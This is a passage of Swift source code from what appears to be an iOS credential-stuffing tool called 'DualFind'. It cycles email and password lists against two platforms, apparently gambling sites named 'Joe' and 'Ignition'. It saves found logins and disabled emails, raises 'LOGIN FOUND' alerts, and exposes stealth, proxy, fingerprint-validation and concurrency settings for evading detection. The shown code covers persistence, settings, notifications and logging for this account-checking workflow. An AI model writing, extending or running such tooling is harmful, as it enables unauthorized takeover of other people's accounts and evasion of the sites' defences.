        notifications.sendBatchComplete(working: hits.count, dead: disabledEmails.count, requeued: 0)
    }

    // MARK: - Persistence

    private func saveResumePoint() {
        let rp = DualFindResumePoint(
            joeEmailIndex: joeEmailIndex,
            joePasswordIndex: joePasswordIndex,
            ignEmailIndex: ignEmailIndex,
            ignPasswordIndex: ignPasswordIndex,
            emails: emails,
            passwords: passwords,
            sessionCount: sessionCount.rawValue,
            timestamp: Date(),
            disabledEmails: Array(disabledEmails),
            foundLogins: hits,
            joeCompletedTests: joeCompletedTests,
            ignCompletedTests: ignCompletedTests
        )
        if let data = try? JSONEncoder().encode(rp) {
            UserDefaults.standard.set(data, forKey: persistKey)
        }
        resumePoint = rp
        hasResumePoint = true
    }

    private func loadResumePoint() {
        guard let data = UserDefaults.standard.data(forKey: persistKey),
              let rp = try? JSONDecoder().decode(DualFindResumePoint.self, from: data) else {
            hasResumePoint = false
            return
        }
        resumePoint = rp
        hasResumePoint = true
        emailInputText = rp.emails.joined(separator: "\n")
        if rp.passwords.count == 3 {
            passwords = rp.passwords
        }
        sessionCount = DualFindSessionCount(rawValue: rp.sessionCount) ?? .six
    }

    private func loadSettings() {
        if let data = UserDefaults.standard.data(forKey: "automation_settings_v1"),
           let loaded = try? JSONDecoder().decode(AutomationSettings.self, from: data) {
            automationSettings = loaded.normalizedTimeouts()
        }
        maxConcurrency = automationSettings.maxConcurrency
    }

    private func loadAppSettings() {
        let persistence = LoginPersistenceService.shared
        if let settings = persistence.loadSettings() {
            debugMode = settings.debugMode
            stealthEnabled = settings.stealthEnabled
            testTimeout = max(settings.testTimeout, AutomationSettings.minimumTimeoutSeconds)
            if let mode = AppAppearanceMode(rawValue: settings.appearanceMode) {
                appearanceMode = mode
            }
        }
    }

    private func reloadAllSettings() {
        loadSettings()
        loadAppSettings()
    }

    private func logSettingsSummary() {
        let joeMode = proxyService.connectionMode(for: .joe)
        let ignMode = proxyService.connectionMode(for: .ignition)
        let deviceWide = DeviceProxyService.shared.isEnabled
        log("Settings: timeout=\(Int(testTimeout))s stealth=\(stealthEnabled) debug=\(debugMode)")
        log("Network: Joe=\(joeMode.label) Ignition=\(ignMode.label) DeviceWide=\(deviceWide)")
        log("Automation: pageLoad=\(Int(automationSettings.pageLoadTimeout))s fpValidation=\(automationSettings.fingerprintValidationEnabled)")
        log("Pattern: persistent sessions, email-clear-only per test, password-clear only on pw advance (2× per platform)")
    }

    // MARK: - Notifications

    private func sendLoginFoundNotification(email: String, platform: String) {
        let content = UNMutableNotificationContent()
        content.title = "LOGIN FOUND"
        content.body = "\(email) on \(platform)"
        content.sound = .defaultCritical
        let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil)
        UNUserNotificationCenter.current().add(request)
    }

    // MARK: - Logging

    func log(_ message: String, level: PPSRLogEntry.Level = .info) {
        let entry = PPSRLogEntry(message: message, level: level)
        logs.insert(entry, at: 0)
        if logs.count > 2000 {
            logs.removeLast(logs.count - 2000)
        }
        let debugLevel: DebugLogLevel
        switch level {
        case .info: debugLevel = .info
        case .success: debugLevel = .success
        case .warning: debugLevel = .warning
        case .error: debugLevel = .error
        }
        logger.log("[DualFind] \(message)", category: .login, level: debugLevel)
    }
}
